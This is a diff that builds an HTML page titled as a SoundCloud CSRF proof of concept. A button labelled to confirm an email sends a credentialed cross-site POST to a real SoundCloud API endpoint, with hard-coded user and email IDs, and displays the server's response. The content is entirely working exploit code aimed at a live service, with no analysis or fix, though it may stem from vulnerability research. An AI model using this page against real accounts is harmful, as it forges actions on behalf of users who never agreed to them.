@@ -1,14 +1,34 @@
-<script>
-fetch("https://api-v2.soundcloud.com/users/1417348911/emails/1582292418/confirmation", {
-  method: "POST",
-  credentials: "include", // ensures cookies are sent if session-based auth is used
-  headers: {
-    "Content-Type": "application/json"
-    // "Authorization": "Bearer <token>"  <-- only works if CORS allows it, and you have the token
-  },
-  body: JSON.stringify({})
-})
-.then(response => response.text())
-.then(data => console.log("Response:", data))
-.catch(err => console.error("Error:", err));
-</script>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>SoundCloud CSRF PoC</title>
+  </head>
+  <body>
+    <h2>Click to Confirm Your Email</h2>
+    <button onclick="submitCSRF()">Submit Request</button>
+
+    <pre id="output" style="background:#eee; padding:10px; margin-top:10px;"></pre>
+
+    <script>
+      function submitCSRF() {
+        fetch("https://api-v2.soundcloud.com/users/1417348911/emails/1582292418/confirmation", {
+          method: "POST",
+          credentials: "include", // include cookies if present
+          headers: {
+            "Content-Type": "application/json"
+            // "Authorization": "Bearer <token>" // Only if token is available and CORS allows
+          },
+          body: JSON.stringify({})
+        })
+        .then(async (res) => {
+          const text = await res.text();
+          document.getElementById("output").textContent =
+            `Status: ${res.status}\n\nResponse:\n${text}`;
+        })
+        .catch((error) => {
+          document.getElementById("output").textContent = "Request failed:\n" + error;
+        });
+      }
+    </script>
+  </body>
+</html>
